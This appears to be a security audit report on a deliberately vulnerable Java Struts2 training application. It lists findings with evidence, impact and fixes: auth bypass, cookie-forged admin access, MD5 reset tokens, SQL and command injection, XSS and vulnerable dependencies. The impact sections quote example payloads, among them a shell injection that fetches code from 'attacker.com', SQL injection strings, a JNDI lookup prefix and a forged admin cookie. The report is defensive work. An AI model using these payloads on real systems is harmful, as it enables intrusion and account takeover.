title: /api/userList.action has no authentication interceptor at all
evidence: I read the whole of struts.xml. Every action in the "default" package that should require login adds <interceptor-ref name="authenticationStack"/> (e.g. lines 47, 52, 57, 63, 69, 75, 80). The "api" package (lines 156-159) declares no default-interceptor-ref and this action adds no interceptor-ref of its own, so the chain in front of it is struts-default's plain defaultStack: no reference to authenticationInterceptor anywhere on the path. AuthenticationInterceptor (interceptors/AuthenticationInterceptor.java lines 15-22) is the only code in the app that checks session.get(Constant.SESSION_USER_HANDLE); it is simply never invoked for this route, so ApiAction.adminShowUsers() (controllers/ApiAction.java lines 35-65) executes for a caller with no session attribute set at all.
impact: An unauthenticated caller who also sends a forged 'admin=1' cookie (see the companion finding on ApiAction.java:40) obtains the full user list -- id, login, email and role -- for every account in the application, with zero prior authentication.
fix: Add <interceptor-ref name="authenticationStack"/> to this action (and to the ping action in the same package), and additionally require sessionGetUser().isAdmin() inside adminShowUsers() as described in the next finding.

title: Admin capability is self-assigned via a client-supplied cookie, not the user's stored role
evidence: adminShowUsers() (ApiAction.java lines 35-65) sets isAdmin purely by scanning the request's own Cookie headers for a cookie literally named "admin" with value "1" (lines 39-44). It never calls sessionGetUser() or consults User.isAdmin()/getRole() (models/User.java lines 80-90), the only place a role is actually recorded server-side. A caller controls every cookie it sends, so it controls this check completely.
impact: Any caller -- unauthenticated given the previous finding, or even a logged-in non-admin user if that route were fixed in isolation -- can grant themselves the admin branch of this handler simply by adding 'Cookie: admin=1' to their request, exposing every user's id/login/email/role.
fix: Delete the cookie scan. Gate the admin branch on sessionGetUser() != null && sessionGetUser().isAdmin(), i.e. the role stored on the User entity and loaded into the session at login.

title: Password-reset token is a deterministic MD5 of the public login name, not a server-issued secret
evidence: resetPasswordByLogin(login, key, password, passwordConfirmation) (UserService.java lines 84-106) is reached unauthenticated: ResetPassword.execute() (controllers/ResetPassword.java lines 63-88) is mapped to the "resetPasswordExecute" action (struts.xml line 93) which carries no interceptor-ref at all, so no session is required. The only check on the caller-supplied 'key' parameter is that it equals MD5(login) -- and 'login' is itself a caller-supplied parameter (ResetPassword.java line 10/26-28). No random value is generated, stored, or emailed anywhere in the codebase (I read UserService.java, ResetPassword.java, and UserRegistrationService.java in full; none of them create or persist a reset token).
impact: Anyone who knows or guesses a login name can compute key = md5(login) themselves (no email, no prior secret) and set that account's password directly via /resetPasswordExecute.action?login=<name>&key=<md5(name)>&password=...&passwordConfirmation=..., taking over any account including an administrator's.
fix: Generate a cryptographically random, single-use, time-limited reset token server-side; persist it against the user; deliver it only out-of-band (email); and validate the caller-supplied token against the stored one instead of recomputing it from public input.

title: Password hash comparison uses String.equals(), not a constant-time comparison
evidence: checkPassword() (UserService.java lines 46-53) is called from UserAuthenticationService.authenticate() (services/UserAuthenticationService.java line 21) on every login attempt. It compares the stored and freshly computed digests with java.lang.String.equals(), which short-circuits at the first differing character instead of comparing in constant time. This is on the same path as the unsalted MD5 hashing done by hashEncodePassword()/save() (lines 28-32, 108-110), which I also read.
impact: An attacker with a sufficiently low-jitter path to the server could in principle use response-time differences to narrow the correct hash byte-by-byte rather than brute-forcing the whole digest space; this is a secondary weakness on top of the unsalted MD5 storage.
fix: Use a constant-time comparison such as java.security.MessageDigest.isEqual(), and separately replace unsalted MD5 with a salted adaptive hash (bcrypt/argon2) whose verify function is constant-time by construction.

title: editUser (password/email change) has no CSRF token, enabling forced password change
evidence: editUser is a state-changing POST action -- UserAction.edit() (controllers/UserAction.java lines 73-102) calls userService.save(user), which rehashes and persists a new password. The only interceptor in front of it is authenticationStack (struts.xml line 63), whose definition (lines 18-21) chains authenticationInterceptor then defaultStack -- no token/tokenSession interceptor. I grepped the whole of struts.xml for 'token' and found only the unrelated demo action named "a8_csrf"; no CSRF interceptor is defined or referenced anywhere. I also read the rendered form, UserEdit.jsp lines 21-36: it emits userId/email/password/passwordConfirmation fields and no hidden CSRF field.
impact: A page an authenticated victim visits can auto-submit a cross-site POST to /editUser.action with an attacker-chosen password and email. The browser attaches the victim's session cookie automatically, so the victim's own account password is silently changed to a value the attacker knows -- full account takeover with a single clicked link.
fix: Add Struts2's token/tokenSession interceptor to authenticationStack (or a dedicated stack for state-changing actions), emit <s:token/> in UserEdit.jsp, and reject requests whose token is missing or stale before edit() runs.

title: addEditProduct (create/update product) has no CSRF token
evidence: addEditProduct is a state-changing POST action -- ProductAction.execute() (controllers/ProductAction.java lines 71-93) calls productService.save(product) directly. It is protected only by authenticationStack (struts.xml line 80), the same chain checked in the previous finding, which never includes a token interceptor anywhere in this file.
impact: A cross-site auto-submitting form can create or overwrite product records as any currently logged-in user, without that user's consent or knowledge.
fix: Add the token interceptor to this action's stack and a CSRF hidden field to ProductEdit.jsp, as for the editUser finding.

title: Session id is not regenerated after successful login (session fixation)
evidence: execute() (Login.java lines 43-56) calls sessionSetUser(user) immediately after the password check succeeds; sessionSetUser() (BaseController.java line 47) only does session.put(Constant.SESSION_USER_HANDLE, user) on the existing session map. I grepped the whole src tree for session.invalidate/regenerate/changeSessionId and found no match anywhere, and read Login.java and BaseController.java in full: neither calls the servlet session's invalidate() or requests a new session id before or after this line. The one inferred link is that Struts2's SessionAware wraps the container HttpSession's attribute map without itself rotating the session id on a plain put() -- this is SessionAware's documented contract, not something I traced into the struts2-core jar, which is outside the target tree.
impact: A session id an attacker fixed in a victim's browser before login (e.g. by forcing a JSESSIONID via a link or subdomain) remains valid and becomes a fully authenticated session for the attacker as soon as the victim logs in through it.
fix: Invalidate the current HttpSession and obtain a fresh one (or call the Servlet 3.1+ request.changeSessionId()) immediately before sessionSetUser(user) on every successful login.

title: Logout removes the user attribute but never invalidates the underlying session
evidence: logout() (Login.java lines 38-41) calls sessionRemoveUser(), which only does session.remove(Constant.SESSION_USER_HANDLE) (BaseController.java line 55). I read BaseController.java in full: it exposes no invalidate() path at all, and nothing else in Login.java or the surrounding struts.xml result (a plain redirect to '/', struts.xml lines 35-39) touches the servlet session. The container session and its JSESSIONID therefore keep living past logout.
impact: A session id captured before logout (via XSS, a shared machine, or a non-TLS hop) remains a live, container-tracked session after the legitimate user has logged out, and -- combined with the missing regeneration at login above -- the same id can be fixed again for a future login.
fix: Call the underlying HttpSession's invalidate() in logout() in addition to removing the USER attribute, e.g. getServletRequest().getSession().invalidate().

title: Login has no attempt limit, lockout or delay
evidence: execute() calls authenticate() directly with no surrounding counter, delay or lockout. I grepped the whole src tree, case-insensitively, for lockout|rate.?limit|throttle|attempt|brute|captcha|max.?attempt and got no matches. I also read web.xml in full: the only two filters registered are OpenEntityManagerInViewFilter and the struts2 filter, neither of which is a rate limiter.
impact: An attacker can submit unlimited login attempts against any known login name; combined with the unsalted MD5 password hashing (UserService.hashEncodePassword), this makes online brute-forcing of accounts practical at high request rates.
fix: Add a per-account (not only per-IP) attempt counter with exponential backoff or lockout after a small number of consecutive failures, and consider a CAPTCHA after repeated failures.

title: /api/ping.action trusts a caller-supplied login and discloses the account's email with no authentication
evidence: Like userList, this action sits in the "api" package (struts.xml lines 156-159) with no interceptor-ref and no package-level default-interceptor-ref, so AuthenticationInterceptor never runs on this path either. ApiAction.ping() (ApiAction.java lines 67-82) takes the request parameter 'login' at face value (getLogin(), set by Struts' params interceptor), calls userService.findByLogin(getLogin()) and writes that user's email into the JSON response, with no check that the caller is authenticated or is the account in question.
impact: An unauthenticated caller can enumerate login names and recover the associated email address for each valid one, one request per guess, with no rate limiting (see the login rate-limit finding for the general absence of throttling in this app).
fix: Require authenticationStack on this action and scope the lookup to the caller's own account, or remove the endpoint if it is debug-only and not meant to be reachable in production.

title: Passwords hashed with unsalted MD5 instead of a slow, salted hash
evidence: The password field enters via Register.execute() (Register.java:85-86) and UserAction.edit() (UserAction.java:97-99); both call userService.save(user), which at UserService.java:31-32 runs `user.setPassword(hashEncodePassword(user.getPassword()))` before persisting, landing on the MD5 digest at line 109. checkPassword() (UserService.java:46-53) re-derives the same MD5 digest of the login attempt and compares it with String.equals(), so authentication also depends on this hash. There is no per-user salt and no iteration count anywhere on this path.
impact: Anyone who reads the users table -- for example through a database backup, or through the SQL injection already present in UserService.findByLoginUnsafe() -- can recover most stored passwords in seconds with an MD5 rainbow table or GPU cracking, exposing credentials that are frequently reused on other sites.
fix: Replace hashEncodePassword() with a memory-hard, salted password hash such as BCrypt (Spring Security's BCryptPasswordEncoder) or Argon2id, and compare with a constant-time check provided by that library.

owasp: A09:2021 Security Logging and Monitoring Failures
title: New password logged in cleartext during password reset
snippet:
logger.info("Changing password for login: " + login +
        " New password: " + password);
evidence: password is the plaintext new password submitted through ResetPassword.execute() (ResetPassword.java:73-75) and passed unmodified into resetPasswordByLogin(login, key, password, passwordConfirmation). Before the value is hashed (line 98's setPassword/save call), it is written verbatim to the log via logger.info at lines 93-94. log4j2.xml configures the `com.appsecco` logger at level debug, so this info-level statement is emitted to the STDOUT appender with no redaction.
impact: Anyone able to read the application's console output or wherever it is shipped (container log driver, log-aggregation/SIEM service, a support engineer with log access) obtains any user's plaintext new password.
fix: Remove the password value from the log statement; log only the login and the boolean outcome of the reset.

title: Struts2 devMode is enabled, exposing debug information to clients
evidence: struts.devMode is set to true in the shipped struts.xml that ships with the application. Struts2's documented dev-mode behaviour (assumed from the framework's published defaults, not re-verified by reading Struts2's own source in this review) renders full exception stack traces, the OGNL value stack and a reloaded-configuration debug console to any client that triggers an error, instead of a generic production error page.
impact: A user who triggers an exception (for example via PingAction's or ResetPassword's caught-exception paths) can see internal class names, file paths and stack traces, which aid further attacks.
fix: Set struts.devMode to false for any deployed/production build.

title: Unauthenticated API endpoint discloses any user's email address
evidence: login is a plain request parameter bound onto ApiAction.login by the Struts parameter interceptor. The api package (struts.xml:156-159) extends struts-default directly with no authenticationStack interceptor-ref, so ping() (ApiAction.java:67-82) is reachable unauthenticated at /api/ping.action. It looks the user up with userService.findByLogin(getLogin()) (line 75) and puts that user's email into the results map at line 79, which renderJSON() (BaseController.java:68-79) writes straight into the HTTP response body as JSON.
impact: Any unauthenticated caller who submits a candidate login learns that account's registered email address, enabling account enumeration and targeted phishing against every user in the system.
fix: Apply the authenticationStack interceptor to the api package (or an API-key check), and do not return another user's email in the response.

title: Bulk export of every user's PII is gated only by a client-supplied cookie
evidence: adminShowUsers() (ApiAction.java:35-65) is reachable unauthenticated at /api/userList.action (struts.xml:156-159 has no authenticationStack on the api package). Authorization is decided purely by whether the request carries a cookie named admin with value 1 (lines 39-44), a value the calling client sets itself and the server never issues or signs. When true, the method iterates userService.findAllUsers() and returns every user's id, login, email and role via renderJSON() (line 64).
impact: Any unauthenticated caller who sends `Cookie: admin=1` receives the full user directory (id, login, email, role) for every account in the database.
fix: Delete this cookie-based check; require the authenticationStack interceptor and a server-side role check read from the authenticated session's User.isAdmin(), never from client-supplied data.

title: Apache Struts2 2.3.30 (struts2-core, struts2-config-browser-plugin, struts2-spring-plugin) carries multiple pre-authentication remote code execution advisories
evidence: pom.xml line 12 sets the `struts2.version` property to `2.3.30`, which is reused by struts2-core (lines 21-24), struts2-config-browser-plugin (lines 26-30) and struts2-spring-plugin (lines 91-95). web.xml (src/main/webapp/WEB-INF/web.xml, lines 13-16 and 23-26) registers `org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter` under the `struts2` filter name and maps it to `/*`, so every HTTP request to this application is parsed by Struts2's own dispatcher and, for multipart requests, by its bundled Jakarta Commons FileUpload-based multipart parser before any application controller code runs. Querying OSV (api.osv.dev, ecosystem Maven) for `org.apache.struts:struts2-core@2.3.30` returned 17 distinct advisories whose ranges include 2.3.30, among them: GHSA-j77q-2qqg-6989 / CVE-2017-5638 (Jakarta Multipart parser OGNL injection via the Content-Type header, fixed 2.3.32 — the Equifax-breach vulnerability), GHSA-cr6j-3jp9-rw65 / CVE-2018-11776 (namespace/action OGNL RCE, fixed 2.3.35), GHSA-v8j6-6c2r-r27c / CVE-2021-31805 (forced OGNL re-evaluation RCE, fixed 2.5.30), GHSA-wp4h-pvgw-5727 / CVE-2019-0230 (forced OGNL evaluation RCE, fixed 2.5.22), GHSA-jc35-q369-45pv / CVE-2020-17530 (forced double OGNL evaluation RCE, fixed 2.5.26), and GHSA-8mr5-h28g-36qx / CVE-2017-9787 (Spring AOP-related DoS, fixed 2.3.33). None of these require application code changes to trigger: the vulnerable parsing/evaluation logic is entirely inside struts2-core itself, reached the moment a crafted HTTP request hits the globally-mapped filter.
impact: An unauthenticated remote attacker can execute arbitrary code on the server with the privileges of the servlet container by sending a single crafted HTTP request (e.g. a malicious Content-Type header for CVE-2017-5638, or a crafted URL/namespace for CVE-2018-11776), leading to full host compromise.
fix: Upgrade the `struts2.version` property in pom.xml to a currently supported Struts 6.x release (or, at minimum, 2.5.33 to close the advisories with a 2.5.x fix) and retest all actions; several of these advisories require the 2.5.x or 6.x line and are not fixable by a Struts 2.3.x point release alone.

title: log4j-core 2.3 is vulnerable to Log4Shell (CVE-2021-44228) and is wired in as the framework's active logger
evidence: pom.xml line 13 sets `log4j2.version` to `2.3`, used by log4j-core (lines 45-49) and log4j-api (lines 39-43). Querying OSV for `org.apache.logging.log4j:log4j-core@2.3` confirms the version falls inside the vulnerable range for GHSA-jfh8-c2jp-5v3q / CVE-2021-44228 (Log4Shell, introduced 2.0-beta9, fixed 2.3.1) and also GHSA-fxph-q3j8-mv87 / CVE-2017-5645 (SocketServer deserialization RCE, fixed 2.8.2), GHSA-7rjr-3q55-vv33 / CVE-2021-45046 and GHSA-p6xc-xr62-6r2g / CVE-2021-45105. That this version is actually loaded, not just declared: pom.xml's jetty-maven-plugin configuration (lines 165-169) sets the system property `xwork.loggerFactory=com.opensymphony.xwork2.util.logging.log4j2.Log4j2LoggerFactory`, forcing Struts2's XWork core to log through Log4j2, and src/main/resources/log4j2.xml (lines 9-11) configures Loggers for `com.opensymphony.xwork2`, `org.apache.struts2` and `com.appsecco` at info/debug level, i.e. Log4j2 is the framework's live logging backend. Separately, src/main/java/com/appsecco/dvja/services/UserService.java line 104 (logger.info("Failed to find user with login: " + login);) and line 93 log the attacker-supplied `login` request parameter by string concatenation, the textbook Log4Shell injection pattern — though that particular `Logger` is imported as `org.apache.log4j.Logger` (line 5), the legacy Log4j 1.x API, and pom.xml also declares `org.slf4j:slf4j-log4j12` (a binding that transitively pulls real Log4j 1.x), so I could not confirm from the 174 files in scope whether this specific call is served by log4j-core 2.3 or by the transitively-pulled Log4j 1.x jar. I mark this `likely` rather than `confirmed` because I did not trace a concrete attacker string into a Log4j2-backed log statement inside Struts2/XWork's own (out-of-scope, compiled) source; the framework-level wiring and the version match are read and confirmed.
impact: If any Log4j2-backed log statement in the running application (application code or the Struts2/XWork framework logging this project explicitly enables) ever includes attacker-controlled text, an unauthenticated attacker can achieve remote code execution via a `${jndi:ldap://...}` payload, without any further precondition.
fix: Upgrade the `log4j2.version` property in pom.xml to 2.17.1 or later, and separately remove or replace `org.slf4j:slf4j-log4j12` so the classpath does not silently carry an additional, unrelated Log4j 1.x implementation.

title: slf4j-log4j12 1.5.2 is a 2008-era, long-unmaintained binding that transitively pulls the end-of-life Log4j 1.x line
evidence: pom.xml lines 51-55 declare `org.slf4j:slf4j-log4j12:1.5.2`, an SLF4J-to-Log4j-1.x binding released in 2008 whose parent SLF4J project stopped issuing 1.5.x releases well over a decade ago. OSV returned no advisory for this exact coordinate/version, but the artifact's purpose is to pull the real `log4j:log4j` 1.x jar onto the classpath as a transitive dependency; Log4j 1.x itself reached end-of-life in 2015 and its own known issues (e.g. CVE-2019-17571 SocketServer deserialization, CVE-2022-23305 JDBCAppender SQL injection) apply to any consumer that enables the corresponding non-default appenders. I did not find a `log4j.properties`/`log4j.xml` in the 174 tracked files that configures those specific appenders, so I cannot confirm they are active here; this is reported as an unmaintained-component finding (CWE-1104), not a confirmed exploit path.
impact: Carrying an end-of-life logging implementation on the classpath means any future disclosure against Log4j 1.x's default or commonly-enabled appenders will never receive an upstream fix, and it duplicates/confuses the logging stack alongside the also-declared Log4j 2.3.
fix: Remove `slf4j-log4j12` and route all logging through the already-declared Log4j 2 (`log4j-api`/`log4j-core`), e.g. via `log4j-slf4j-impl`, after upgrading log4j-core past 2.17.1.

title: mysql-connector-java 5.1.42 is affected by multiple Connector/J privilege-management advisories
evidence: pom.xml lines 133-137 declare `mysql:mysql-connector-java:5.1.42`. Querying OSV for this coordinate/version returned four advisories whose ranges include 5.1.42: GHSA-jcq3-cprp-m333 / CVE-2019-2692 (privilege escalation, fixed 8.0.16), GHSA-4vrv-ch96-6h42 / CVE-2018-3258 (improper privilege management, fixed 8.0.13), GHSA-g76j-4cxx-23h9 / CVE-2022-21363 (fixed 8.0.28) and GHSA-m6vm-37g8-gqvh / CVE-2023-22102 (connector takeover, fixed 8.2.0). All four are in the driver's client-side connection-handling code and are documented as exploitable primarily by a malicious or compromised MySQL server the application connects to, or via a local, low-privileged actor on the same host; I did not read db/schema.sql or the deployment config far enough to determine whether the database endpoint is trusted, so this is `likely` rather than `confirmed`.
impact: A malicious or compromised MySQL server (or an attacker able to influence the connection target/parameters) could use these driver-side flaws to escalate privileges or take over the client connection; this is not directly remotely exploitable by an anonymous web user of this application.
fix: Upgrade `mysql:mysql-connector-java` (or migrate to the renamed `com.mysql:mysql-connector-j`) to at least 8.2.0, the version that closes CVE-2023-22102.

title: gson 2.8.1 is affected by CVE-2022-25647 (deserialization of untrusted data), but the app's own code does not appear to call the vulnerable sink
evidence: pom.xml lines 139-143 declare `com.google.code.gson:gson:2.8.1`. OSV reports GHSA-4jrv-ppp4-jm57 / CVE-2022-25647 (deserialization of untrusted data), fixed in 2.8.9, whose range includes 2.8.1. The only application use of Gson I found is src/main/java/com/appsecco/dvja/controllers/BaseController.java line 69 (`Gson gson = new GsonBuilder().create();`) and line 73 (`ServletActionContext.getResponse().getWriter().write(gson.toJson(jsonMap));`), which only serializes server-side data outward via `toJson`; a grep of src/ for `fromJson`/`JsonParser` found no matches, so the polymorphic-deserialization pattern the CVE requires (`fromJson` against `Object`/an interface type) is not exercised by this codebase's own code as read.
impact: As declared, the library version carries a known deserialization weakness; because no reachable call to Gson's deserializing API was found in the reviewed source, exploitability through this application's own code is unconfirmed rather than ruled out (a future change that adds a `fromJson` call on attacker-supplied JSON would reopen this).
fix: Upgrade `gson` to 2.8.9 or later regardless of current reachability, since it costs nothing and removes the risk for any future code path.

title: hibernate-core/hibernate-entitymanager/hibernate-annotations pin a 2009-2010 Hibernate 3.x line with no more upstream support
evidence: pom.xml declares `hibernate-core:3.3.1.GA` (lines 97-101), `hibernate-entitymanager:3.4.0.GA` (lines 103-107) and `hibernate-annotations:3.4.0.GA` (lines 109-113) — all released in the 2009-2010 era and superseded by the 5.x/6.x lines years ago; the Hibernate 3.x branch receives no security patches today. Querying OSV for `hibernate-core@3.3.1.GA` returned GHSA-8grg-q944-cch5 / CVE-2019-14900 and GHSA-j8jw-g6fq-mp7h / CVE-2020-25638 (both Hibernate ORM SQL injection), whose ranges are stated by the advisory as `introduced 0, fixed 5.3.18`/`5.3.20.Final`, i.e. broad enough to include 3.3.1.GA; I did not read the Hibernate 3.3.1.GA source to confirm the specific `@Filter`/`@OrderBy` code path these CVEs describe is present at that early version, so I report this as a `possible`, low-confidence CVE match layered on top of a `confirmed`, low-severity maintenance concern: three declared components with no realistic path to a vendor fix.
impact: No further security fixes will ever be issued for this Hibernate 3.x line; any newly-discovered issue in the ORM layer (SQL injection via HQL/Criteria misuse, deserialization in query results, etc.) has no upstream remediation path and must be worked around entirely in application code.
fix: Plan a migration to a currently maintained Hibernate ORM major version (5.6.x LTS or 6.x), which is a non-trivial API migration for this codebase but is the only way to regain a supportable ORM dependency.

title: spring-tx and spring-orm are pinned to Spring Framework 3.0.5.RELEASE (2011), a line with no more upstream support
evidence: pom.xml line 15 sets `spring.version` to `3.0.5.RELEASE` (released March 2011), used by `spring-tx` (lines 121-125) and `spring-orm` (lines 127-131). Spring Framework 3.0.x reached end of open-source support years ago. Querying OSV for `org.springframework:spring-tx@3.0.5.RELEASE` and `spring-orm@3.0.5.RELEASE` returned no advisories for these exact artifact/version pairs, so I am not naming a CVE for this pair; I report it as an unmaintained-component (CWE-1104) finding rather than dressing it as a vulnerability I did not find evidence for.
impact: Running a decade-plus-old Spring Framework line means no vendor security patches are available for either artifact; the project inherits whatever undiscovered or unfixed issues exist in that code with no remediation path other than upgrading.
fix: Upgrade `spring.version` to a currently supported Spring Framework 5.x/6.x release, which will also require reviewing the Hibernate integration for API compatibility.

title: SQL injection in user login search via string-concatenated JPQL
snippet: Query query = entityManager.createQuery("SELECT u FROM User u WHERE u.login = '" + login + "'");
evidence: The `userSearch` action in struts.xml (line 56) maps to UserAction.search() (src/main/java/com/appsecco/dvja/controllers/UserAction.java:104-121). That method reads the `login` property, which Struts' params interceptor populates directly from the request's `login` form field (setLogin at UserAction.java:37-39, bound to the `<s:textfield name="login">` in UserSearch.jsp:22), with only an isEmpty check, no escaping. It is passed unmodified to userService.findByLoginUnsafe(getLogin()) at UserAction.java:109, which builds the JPQL string by concatenation at UserService.java:75 with no parameter binding. The only guard on the route is the authenticationStack interceptor, which requires any logged-in session (AuthenticationInterceptor.java:18) and performs no further validation or escaping of the login value.
impact: Any authenticated user (registration is self-service and unrestricted) can inject JPQL/SQL through the login field, e.g. `' OR '1'='1` to dump arbitrary user rows, or UNION-based payloads to read other tables reachable by the JPA persistence unit, bypassing per-user data isolation entirely.
fix: Use a parameterized query as UserService.findByLogin already does two methods above: entityManager.createQuery("SELECT u FROM User u WHERE u.login = :login").setParameter("login", login); remove findByLoginUnsafe or route UserAction.search() through the safe findByLogin method instead.

title: SQL injection in product listing search via string-concatenated JPQL LIKE clause
snippet: Query query = entityManager.createQuery("SELECT p FROM Product p WHERE p.name LIKE '%" + name + "%'");
evidence: The `listProduct` action in struts.xml (line 74) maps to ProductAction.list() (src/main/java/com/appsecco/dvja/controllers/ProductAction.java:62-69). searchQuery is set from the request via the params interceptor (setSearchQuery, ProductAction.java:22-24), bound to the `<s:textfield name="searchQuery">` form in ProductList.jsp:63. When non-empty, list() calls productService.findContainingName(searchQuery) at ProductAction.java:66, which concatenates the raw string directly into a JPQL LIKE clause at ProductService.java:48 with no parameter binding or escaping. The route only requires the authenticationStack session check (AuthenticationInterceptor.java:18), no input validation.
impact: Any authenticated user can break out of the LIKE clause (e.g. `%' OR '1'='1` or UNION-based payloads) to enumerate or exfiltrate arbitrary rows from any table the persistence unit's database user can reach.
fix: Bind the value as a parameter instead of concatenating it: entityManager.createQuery("SELECT p FROM Product p WHERE p.name LIKE :name").setParameter("name", "%" + name + "%").

title: OS command injection in the ping diagnostic feature
evidence: The `ping` action in struts.xml (line 68) maps to PingAction.execute(), guarded only by the authenticationStack session check. execute() (PingAction.java:30-41) requires only that `address` is non-empty, then calls doExecCommand(). `address` is set from the request by the params interceptor via setAddress (PingAction.java:18-20), bound to the `<s:textfield name="address">` field in Ping.jsp. doExecCommand() concatenates that value unsanitized into a shell command string handed to `/bin/bash -c` at line 45, then Runtime.exec(command) at line 46 executes it.
impact: Any authenticated user can supply an address such as `127.0.0.1; cat /etc/passwd` or `$(curl attacker.com/x|sh)` to run arbitrary shell commands as the application's OS user, since the value reaches `/bin/bash -c` verbatim.
fix: Do not build a shell command string from user input. Validate `address` as a strict IP/hostname (allowlist regex) before use, and prefer ProcessBuilder with an argument array and no shell (e.g. {"ping","-c","5",address}) after validation, rather than concatenating into a `bash -c` string.

title: Reflected XSS in product search results via raw scriptlet output
evidence: The `listProduct` action (struts.xml:74) forwards to this JSP after ProductAction.list() runs with the `searchQuery` request parameter (ProductAction.java:62-69). This line reads the same parameter directly from the raw HttpServletRequest with `request.getParameter("searchQuery")` and writes it into the HTML with a `<%= %>` scriptlet, bypassing Struts' auto-escaping `<s:property>` tag used everywhere else on the page (e.g. line 42) and performing no HTML-encoding at all.
impact: An attacker can craft a link to `listProduct?searchQuery=<script>...</script>` and send it to any authenticated victim; visiting it executes attacker-controlled JavaScript in the victim's session, allowing session/cookie theft or actions performed as the victim.
fix: Replace the scriptlet with the escaping tag already used elsewhere on this page, e.g. `<s:property value="searchQuery"/>` (default `escape=true`), or explicitly HTML-encode the parameter before output.

title: Stored XSS in product name rendered with escaping disabled
evidence: The `addEditProduct` action (struts.xml:79) maps to ProductAction, whose `product` field is populated by Struts' params interceptor from the `product.name` form field in ProductEdit.jsp:30 (auto-vivified via getProduct()/setName()). ProductAction.execute() (ProductAction.java:71-93) calls productService.save(product) with no sanitization, persisting the raw name (ProductService.java:27-34). Every visitor to `listProduct` then has that stored value rendered here with `escape="false"`, which explicitly disables Struts' default HTML-escaping for the `<s:property>` tag.
impact: Any authenticated user who can add/edit a product (no extra role check is present) can store an HTML/JS payload in the product name; it then executes in the browser of every other user who views the product list, enabling session theft or privilege escalation across the user base.
fix: Remove `escape="false"` so the tag's default HTML-escaping applies (`<s:property value="name"/>`), or if raw HTML is genuinely required, sanitize the stored value through an allowlist HTML sanitizer immediately before this render.

title: Unvalidated open redirect via the `url` request parameter
evidence: The `redirect` action (struts.xml:100-102) has no interceptor-ref, so it is reachable unauthenticated. It maps to RedirectAction (src/main/java/com/appsecco/dvja/controllers/RedirectAction.java), whose `url` field is set directly from the request's `url` parameter via setUrl (RedirectAction.java:13-15) with no allowlist or same-origin check. execute() (RedirectAction.java:17-22) returns "redirect" whenever `url` is non-empty, and this result config evaluates `${url}` as the OGNL-interpolated Location for an HTTP redirect, sending the browser to whatever URL the attacker supplied.
impact: An attacker can send a victim a link such as `/redirect?url=https://evil.example/phish` on the trusted domain; the victim's browser is redirected to an attacker-controlled site, useful for phishing and for bypassing URL allowlists in other controls.
fix: Validate `url` against an allowlist of internal paths or known-good hosts before returning the redirect result, or resolve it and reject any value whose host does not match the application's own host.

title: Struts2 developer mode (devMode) is enabled, exposing debug diagnostics and the OGNL debugging console
evidence: struts.xml sets struts.devMode to true globally for the whole application (there is no per-environment override anywhere else in the tree, and scripts/start.sh runs the app with `mvn jetty:run`, i.e. this exact config file, in the container that docker-compose.yml exposes on port 8080). With devMode on, Struts2's default interceptor stack (inherited here by every action through `extends="struts-default"` at struts.xml:12 and by authenticationStack's `interceptor-ref name="defaultStack"` at struts.xml:20) renders a full exception report with stack traces and internal parameter/value-stack details on any action error, and historically exposes the `?debug=command`/`?debug=browser` OGNL console endpoints that the framework's bundled debugging interceptor provides when devMode is on. I read the config line and the package inheritance chain that puts every action under this mode; I did not open the vendored struts-default.xml inside the struts2-core jar to directly confirm the debugging interceptor is still bound in this exact stack, so the console/RCE portion of the impact is inferred from well-documented Struts2 devMode behavior rather than fully traced.
impact: Any remote, unauthenticated request that triggers an action exception returns internal stack traces, class names and OGNL value-stack contents; if the debugging interceptor is present as by default, an attacker can additionally reach an interactive OGNL console capable of arbitrary server-side code execution, without any credentials.
fix: Set struts.devMode to false in the shipped struts.xml (or override it via struts.properties/system property per environment) before any deployment that is reachable outside a developer's own machine.

title: Struts2 config-browser debug plugin is shipped in the production build
evidence: This dependency has no <scope>test</scope> (contrast with struts2-junit-plugin at pom.xml:32-37, which is explicitly scoped to test), so it is packaged into the deployed WAR. The struts2-config-browser-plugin auto-registers its own namespace (conventionally /config-browser) via a struts-plugin.xml bundled in its jar, outside the application's own `default` package and therefore outside the authenticationStack interceptor defined in struts.xml, and combined with struts.devMode=true (struts.xml:7) it is documented to reveal action mappings, interceptor stacks and validator configuration to any visitor. I read the dependency declaration and its missing scope; I did not open the plugin jar's own struts-plugin.xml to confirm the exact URL it registers, so the plugin's own routing is inferred from its documented behavior rather than read directly.
impact: An unauthenticated visitor can enumerate the application's full action/interceptor/validator configuration, materially aiding further attacks (e.g. against the devMode OGNL console in platform-001).
fix: Remove struts2-config-browser-plugin from the production dependency set, or mark it test/provided scope and ensure it is excluded from the packaged WAR.

title: No security-headers filter is mounted: CSP, X-Frame-Options, X-Content-Type-Options and HSTS are all absent
evidence: web.xml declares exactly two filters (Spring's OpenEntityManagerInViewFilter and this struts2 filter) and no others; this is the last filter registered before the filter-mapping block that wires both filters to `/*`. I grepped the whole target tree for Access-Control, X-Frame-Options, Content-Security-Policy, Strict-Transport, X-Content-Type, addHeader and setHeader and the only hit is BaseController.java:72, which sets `Content-Type: application/json` and nothing else. No servlet filter, interceptor or response helper anywhere in the codebase sets X-Frame-Options, Content-Security-Policy, X-Content-Type-Options or Strict-Transport-Security.
impact: Responses can be framed by any origin (clickjacking), browsers may MIME-sniff response bodies leading to stored-content XSS in some browsers, and there is no HSTS to prevent protocol downgrade to plain HTTP.
fix: Add a servlet Filter (or upgrade the Struts2/Spring stack to a version with a built-in security-headers facility) that sets X-Frame-Options: DENY (or frame-ancestors in a CSP), X-Content-Type-Options: nosniff, a restrictive Content-Security-Policy, and Strict-Transport-Security, and mount it ahead of the struts2 filter in web.xml.

title: Session cookie has no explicit Secure, HttpOnly or SameSite configuration, and keeps the container's default name
evidence: I read the whole web.xml (36 lines, reproduced above and around this excerpt) and it contains no <session-config> element and therefore no <cookie-config> child to set secure, http-only or a custom session-cookie name; this listener block is the last piece of configuration before the closing </web-app> tag, i.e. where a <session-config> would have to be added. The app is built and run with `mvn jetty:run` (pom.xml:160-161, scripts/start.sh:9), so the session cookie's Secure/SameSite behaviour falls back to the bundled Jetty 9.3.0.M2's own defaults rather than an explicit application setting; I did not trace into Jetty's own source to confirm those defaults, so this link is inferred rather than read.
impact: Without an explicit Secure flag the session cookie (JSESSIONID by default) can be sent over plain HTTP if the app is ever reached that way, and without SameSite it is more exposed to cross-site request delivery; the default cookie name also makes the app easy to fingerprint.
fix: Add a <session-config><cookie-config><secure>true</secure><http-only>true</http-only></cookie-config></session-config> block to web.xml, set a non-default session cookie name, and configure SameSite (via the servlet container or a response filter) once the deployment target's servlet version supports it.

